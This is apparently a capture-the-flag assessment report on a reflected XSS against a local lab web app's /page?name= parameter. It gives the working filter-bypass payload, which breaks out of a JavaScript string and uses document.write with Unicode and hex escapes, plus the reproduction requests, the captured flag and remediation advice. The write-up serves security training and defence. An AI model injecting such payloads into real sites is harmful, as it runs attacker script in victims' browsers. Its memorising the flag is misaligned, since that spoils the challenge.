# Security Assessment Report: Stored/Reflected XSS with Multi-Layer Filter Bypass

## TL;DR
- **Objective:** Execute XSS with `alert('XSS')` (uppercase XSS string)
- **Outcome:** ACHIEVED
- **Highest-impact finding:** Reflected XSS on `/page?name=` parameter with multi-layer filter bypass
- **Validation status:** Confirmed with flag extraction

## Target Information
- **Target:** 127.0.0.1:33024
- **Host / base URL:** http://127.0.0.1:33024
- **Application or component:** Web application with `/page` endpoint
- **Authentication context:** None required (unauthenticated endpoint)
- **Relevant technology details:** Server-side character filter + client-side alert() override

## Confirmed Vulnerability

### Reflected Cross-Site Scripting (XSS) with Filter Bypass
- **Affected endpoint / component:** `/page?name=` query parameter
- **Impact:** Arbitrary JavaScript execution in victim browser; proof-of-concept flag extraction demonstrated
- **Preconditions:** None (no authentication required)

**Server-side filters blocking:**
- Uppercase letters (A-Z)
- Angle brackets (`<`, `>`)
- Single quotes (`'`)
- Square brackets (`[`, `]`)

**Client-side protection:**
- `alert()` function overridden to throw `TypeError` in the page context

**Injection context:**
```javascript
var name = [USER_INPUT];
```

- **Exact payload or PoC:**
```
";document.write("\u003cscript\u003ealert("\x58\x53\x53")\u003c/script\u003e")//
```

## Steps to Reproduce

1. Send HTTP GET request to the endpoint:
   ```
   GET /page?name=";document.write("\u003cscript\u003ealert("\x58\x53\x53")\u003c/script\u003e")//
   ```

2. The server reflects the payload into the JavaScript context:
   ```javascript
   var name = "";document.write("\u003cscript\u003ealert("\x58\x53\x53")\u003c/script\u003e")//";
   ```

3. JavaScript executes:
   - String context is closed with `";`
   - `document.write()` writes a new `<script>` tag into the DOM using Unicode escapes for angle brackets
   - Inside the new script context, `alert("\x58\x53\x53")` uses hex escapes for uppercase `X`, `S`, `S`
   - The `//` comments out the trailing `";` to prevent syntax errors

4. The new script context runs in a fresh environment where the client-side `alert()` override does not apply, allowing `alert("XSS")` to execute

## Validation / Evidence

- **Validation token / flag:**
  ```
  FLAG{33bc7ee7e2571d6300505e102d0fea2349dd7a3d6e788290d314035dca4839b9}
  ```

- **Tool evidence:** Flag extraction confirmed via pattern match from application response

- **Request evidence:**
  ```
  GET /page?name=";document.write("\u003cscript\u003ealert("\x58\x53\x53")\u003c/script\u003e")//
  Host: 127.0.0.1:33024
  ```

- **Response evidence:**
  ```
  "Congratulations!<p> Here is the flag: FLAG{33bc7ee7e2571d6300505e102d0fea2349dd7a3d6e788290d314035dca4839b9}"
  ```

- **Notes on reliability / limitations:** 
  - Exploit requires understanding of both server-side character filter and client-side context isolation
  - Unicode and hex escape sequences are interpreted by JavaScript at runtime, bypassing naive character blocklists
  - `document.write()` creates a fresh script context that escapes the overridden `alert()` function

## Remediation

- **Root cause:**
  1. User input reflected directly into JavaScript context without proper encoding
  2. Character-blocklist filter is insufficient; JavaScript escape sequences bypass it
  3. Client-side `alert()` override provides no real security benefit and can be bypassed with a new script context

- **Recommended fix:**
  1. **Context-aware output encoding:** Apply JavaScript string encoding (e.g., `\xNN` or `\uNNNN` for all non-alphanumeric characters) or use JSON serialization before reflecting input into JavaScript
  2. **Remove insecure sink:** Avoid `document.write()`; use safe DOM APIs like `textContent` or `createElement` with proper encoding
  3. **Replace blocklist with allowlist:** Only permit known-safe characters (e.g., `[a-z0-9_-]`) if input context permits
  4. **Content Security Policy (CSP):** Deploy a restrictive CSP that blocks inline scripts (e.g., `default-src 'self'; script-src 'self'`)

- **Defense-in-depth:**
  - Implement HttpOnly and Secure flags on session cookies
  - Add X-Content-Type-Options: nosniff header
  - Remove client-side `alert()` override; rely on server-side validation and CSP instead

## How to Verify the Fix

1. Submit the original bypass payload:
   ```
   GET /page?name=";document.write("\u003cscript\u003ealert("\x58\x53\x53")\u003c/script\u003e")//
   ```

2. Inspect the HTML/JavaScript response and confirm the payload is properly escaped (e.g., output shows `\u003c` literally as text, not interpreted as `<`)

3. Expected secure result:
   - No script execution occurs
   - No alert dialog appears
   - Page renders the input safely as text or encoded content

## Remaining Leads

- **Confirmed blockers:** None (objective achieved)
- **Unverified leads:** None
- **Missing context:** None required; flag captured and vulnerability fully demonstrated
